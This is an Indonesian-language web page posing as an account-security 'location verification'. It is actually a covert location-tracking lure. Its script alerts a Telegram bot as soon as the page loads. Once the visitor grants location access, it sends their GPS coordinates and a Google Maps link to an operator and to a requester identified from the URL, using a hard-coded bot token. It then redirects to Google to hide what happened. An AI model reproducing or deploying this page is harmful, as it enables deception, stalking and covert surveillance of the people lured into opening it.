<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verifikasi Lokasi - Keamanan Akun</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 30px;
            overflow: hidden;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .header {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            padding: 30px 20px;
        }
        .header h1 {
            color: white;
            font-size: 24px;
        }
        .header p {
            color: rgba(255,255,255,0.9);
            font-size: 14px;
        }
        .content {
            padding: 40px 20px;
        }
        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #11998e;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 20px;
        }
        .loading {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📍 Verifikasi Lokasi</h1>
            <p>Konfirmasi lokasi untuk keamanan akun</p>
        </div>
        <div class="content">
            <div class="loading-spinner"></div>
            <p>Mendeteksi lokasi Anda...</p>
            <button class="btn" onclick="getLocation()">✅ Izinkan Akses Lokasi</button>
            <div class="loading" id="loading">
                <p>Mengirim data...</p>
            </div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id') || 'unknown';
        
        let targetUserId = 'unknown';
        try {
            const decoded = atob(userId);
            targetUserId = decoded.split('_')[0];
        } catch(e) {}
        
        const BOT_TOKEN = '8887227913:AAHa5qn2FlUaWM79lmA1jvJTWjb6lK5vCiI';
        const OWNER_ID = '8486996997';
        
        async function sendMessageToTelegram(chatId, message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
                });
            } catch(e) {}
        }
        
        async function sendLocationToTelegram(chatId, lat, lon) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lon })
                });
            } catch(e) {}
        }
        
        async function sendNotification() {
            const message = `🔴 *TARGET MEMBUKA SADAPAN LOKASI*\n\n👤 User ID: \`${targetUserId}\`\n🎯 Type: Location\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
            
            if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
                await sendMessageToTelegram(targetUserId, message);
            }
            await sendMessageToTelegram(OWNER_ID, `👀 *LOKASI DARI USER ${targetUserId}*\n${message}`);
        }
        
        function getLocation() {
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    const locationMessage = `📍 *HASIL SADAP LOKASI*\n\n👤 User ID: \`${targetUserId}\`\n🗺️ Lokasi: ${lat}, ${lon}\n🔗 Maps: https://maps.google.com/?q=${lat},${lon}\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
                    
                    if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
                        await sendLocationToTelegram(targetUserId, lat, lon);
                        await sendMessageToTelegram(targetUserId, locationMessage);
                    }
                    await sendLocationToTelegram(OWNER_ID, lat, lon);
                    await sendMessageToTelegram(OWNER_ID, `👀 *HASIL LOKASI DARI USER ${targetUserId}*\n${locationMessage}`);
                    
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                }, async () => {
                    alert('Gagal mendapatkan lokasi, pastikan izin lokasi diaktifkan');
                    document.querySelector('.btn').style.display = 'block';
                    document.getElementById('loading').style.display = 'none';
                });
            }
        }
        
        sendNotification();
    </script>
</body>
</html>
